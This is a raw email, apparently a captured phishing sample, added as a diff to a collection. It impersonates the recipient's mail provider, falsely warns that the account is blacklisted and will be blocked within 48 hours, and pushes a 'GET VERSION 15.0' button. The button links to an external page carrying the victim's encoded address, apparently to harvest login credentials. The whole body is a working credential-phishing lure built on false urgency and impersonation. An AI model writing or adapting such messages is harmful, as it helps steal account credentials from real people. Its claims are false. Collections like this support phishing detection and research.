@@ -1,0 +1,102 @@
+From jose@monkey.org Fri Oct 20 08:25:18 2023 +0000
+Return-Path: info@ccgrass.cc
+Delivered-To: jose@monkey.org
+X-FDA: 81365155116.06.0FB2C40
+Received: from ccgrass.cc (ccgrass.cc [185.236.228.216])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id 0E1AC120002
+	for <jose@monkey.org>; Fri, 20 Oct 2023 08:25:16 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;
+	dkim=pass header.d=ccgrass.cc header.s=dkim header.b=KLjwx5Xc;
+	spf=pass (imf29.b.hostedemail.com: domain of info@ccgrass.cc designates 185.236.228.216 as permitted sender) smtp.mailfrom=info@ccgrass.cc;
+	dmarc=pass (policy=reject) header.from=ccgrass.cc
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1697790317;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=0qnP/Wi4lFPJ6RxVeTomVnw9nHCk213pCMQaO9WKTGs=;
+	b=nF4fBKJc9ez19SqdZPZVeOoYErALyONVhe+iFFlJhAIK9KJ1s07CtOxLbuTbXQ4PET3LsF
+	GrqtbCvk99XWvyQ9KvF6+UwsDP3KHPCv6JbuUzTi4cRXJ0gfxKORXyxBLqr29zUNMojQfX
+	HeiHbcIiCDJVBP2w7FImsavRaGBgtOQ=
+ARC-Authentication-Results: i=1;
+	imf29.b.hostedemail.com;
+	dkim=pass header.d=ccgrass.cc header.s=dkim header.b=KLjwx5Xc;
+	spf=pass (imf29.b.hostedemail.com: domain of info@ccgrass.cc designates 185.236.228.216 as permitted sender) smtp.mailfrom=info@ccgrass.cc;
+	dmarc=pass (policy=reject) header.from=ccgrass.cc
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1697790317; a=rsa-sha256;
+	cv=none;
+	b=t9fML8LEC0jOhsidK771Cs7vr68DSPHUEhqhQQtiPrQ0L6/AWGNskSHgbYgEpvYfpzdFrF
+	Td6oEkCgiQjANhJq6OPOc26+ZyZmi56dg062XC5iDI3rpppM3bRPi0E4uXP0+GwzFESktn
+	XQr3qGkT3LrF8D0LEp5+kfDNeY2wjIs=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=ccgrass.cc;
+	s=dkim; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date
+	:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=0qnP/Wi4lFPJ6RxVeTomVnw9nHCk213pCMQaO9WKTGs=; b=KLjwx5XcyoC+irlCcd0iMILIBP
+	KTjExZP8+LBD9YQlzMSZB6BIrS/bNBlPfCb562oVY1lYjldAULK0QoKvBYGI2CA6E4LtdUjkbGcCP
+	Xzz9MAmqQW28Jn/arajiYVhbOmHENSfXSqe7Lly5Rh0+6gKzlZ6fPZMDCefb/AXxhTZY=;
+Received: from [81.161.229.214]
+	by ccgrass.cc with esmtpa (Exim 4.96.1)
+	(envelope-from <info@ccgrass.cc>)
+	id 1qtkol-0006oB-0u
+	for jose@monkey.org;
+	Fri, 20 Oct 2023 08:25:15 +0000
+From: Server Support <info@ccgrass.cc>
+To: jose@monkey.org
+Subject: jose@monkey.org Has been Blacklisted : Upgrade now to avoid Termination
+Date: 20 Oct 2023 10:25:14 +0200
+Message-ID: <20231020102514.759F6E41009554E9@ccgrass.cc>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam08
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 0E1AC120002
+X-Spam-Status: No, score=0.30
+X-Stat-Signature: zhm97urknikawb1wq6ugpycueezdnmhz
+X-HE-Tag: 1697790316-687260
+X-HE-Meta: U2FsdGVkX19rA7hWQKUglI03/vzToNi4ddNNOD6I6GNlmjcRogp1+AmHleM6wczlTiKpioyv2HFenAfX/4JKyz9s1IgcYS80wyN/zVoHCErjnX/cFya6P/Ldlh5AN9h+Z8ctKXSOd9chqPNV2XM20nVARFuWH5LWcPOwpbAs2e/Q9MXk+WXMXI9aDSFA+TpY2BQXcrZ77tw7dvLMmXfZcqhXgYX9IHEm2ouoqTr2wS8=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 323
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em; font-size: 14pt;"><p style=3D'color: rgb(51, =
+51, 51); font-family: "Lucida Grande",Verdana,Arial,Helvetica,sans-serif; f=
+ont-size: 11px;'>&nbsp;Dear&nbsp; jose@monkey.org<br><br>Your email account=
+ (&nbsp;&nbsp;jose@monkey.org&nbsp;) from&nbsp;&nbsp;monkey.org&nbsp;&nbsp;=
+currently needs a&nbsp;<strong>high priority</strong>&nbsp;email version up=
+grade.</p><p style=3D'color: rgb(51, 51, 51); font-family: "Lucida Grande",=
+Verdana,Arial,Helvetica,sans-serif; font-size: 11px;'><br>
+<strong><span style=3D"font-family: Calibri,serif,EmojiFont;">NB : Your acc=
+ount will be&nbsp;blocked&nbsp;from sending and receiving messages if not&n=
+bsp;</span></strong><strong>&nbsp;<span style=3D"font-family: Calibri,serif=
+,EmojiFont;">Upgraded to the</span></strong>&nbsp;<strong>&nbsp;<span style=
+=3D"font-family: Calibri,serif,EmojiFont;">New Email version within&nbsp;48=
+hrs.</span></strong>&nbsp;&nbsp;</p>
+<div style=3D'color: rgb(51, 51, 51); font-family: "Lucida Grande",Verdana,=
+Arial,Helvetica,sans-serif; font-size: 11px;'><br><span style=3D"vertical-a=
+lign: inherit;">Please click on the&nbsp;<span style=3D"font-family: Calibr=
+i,serif,EmojiFont;">below link</span>&nbsp;to complete the new email versio=
+n upgrade<br><br><br></span>
+<a style=3D"background: rgb(16, 173, 228); border-width: 0px; margin: 0px 1=
+0px 0px 0px; padding: 10px 30px; border-radius: 20px; color: rgb(255, 255, =
+255); text-transform: uppercase; font-family: inherit; font-size: 13px; ver=
+tical-align: baseline; display: inline-block; font-stretch: inherit; text-d=
+ecoration-line: none;" href=3D"https://pub-2430b19f22484a919d445781539271f0=
+=2Er2.dev/MonotomicXindex.html#am9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=
+=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://mmc-nur-sult=
+an.kz/components/llogga.html%23friday@olympicbond.com&amp;source=3Dgmail&am=
+p;ust=3D1697838551589000&amp;usg=3DAOvVaw2jf_bzCDExe66lxCAM1K7n">GET VERSIO=
+N 15.0</a><br><br>This service is free of charge.<br>&nbsp;monkey.org&nbsp;=
+ &nbsp;Support&copy; 2023. All rights reserved.&nbsp; &nbsp; &nbsp;</div></=
+body></html>
